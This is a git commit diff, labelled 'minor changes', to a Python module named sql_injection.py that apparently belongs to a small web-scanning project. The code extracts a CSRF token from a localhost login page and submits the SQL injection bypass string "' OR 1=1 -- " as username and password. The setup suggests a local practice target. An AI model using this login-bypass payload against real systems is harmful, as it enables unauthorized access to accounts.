9774d613f46e18c8d1d276dca26a8e56f60cdaac
jpaullopes <jpaullopes27@gmail.com>
2025-08-17 12:14:40 -0300

    minor changes

--- src/modules/sql_injection.py
+++ src/modules/sql_injection.py
@@ -4,6 +4,7 @@ from src.recon.spider import html_extractor
 from bs4 import BeautifulSoup
 
 # Cria uma sessão para manter cookies e headers
+session_actual = requests.Session()
 
 def login_test(url, dictionary_login, session):
     """Realiza o POST de login e retorna o response."""
@@ -20,22 +21,19 @@ def token_extractor(url, token_name, session):
     token = soup.find("input", {"name": token_name})['value']
     return token
 
-with requests.Session() as session_actual:
-    # Extrai o token CSRF da página de login
-    user_token = token_extractor("http://localhost/login.php", "user_token", session_actual)
+# Extrai o token CSRF da página de login
+user_token = token_extractor("http://localhost/login.php", "user_token", session_actual)
 
-    # Monta o dicionário de login
-    dictionary_login = {
-        "username": "' OR 1=1 -- ",
-        "password": "' OR 1=1 -- ",
-        "user_token": f"{user_token}",
-        "Login": "Login"
-    }
+# Monta o dicionário de login
+dictionary_login = {
+    "username": "' OR 1=1 -- ",
+    "password": "' OR 1=1 -- ",
+    "user_token": f"{user_token}",
+    "Login": "Login"
+}
 
-    # Realiza o login
-    resposta = login_test("http://localhost/login.php", dictionary_login, session_actual)
+# Realiza o login
+resposta = login_test("http://localhost/login.php", dictionary_login, session_actual)
 
-    # Exibe o HTML retornado
-    #print(resposta.text)
-    soup = BeautifulSoup(resposta.text, "html.parser")
-    print(soup.prettify())
+# Exibe o HTML retornado
+print(resposta.text)
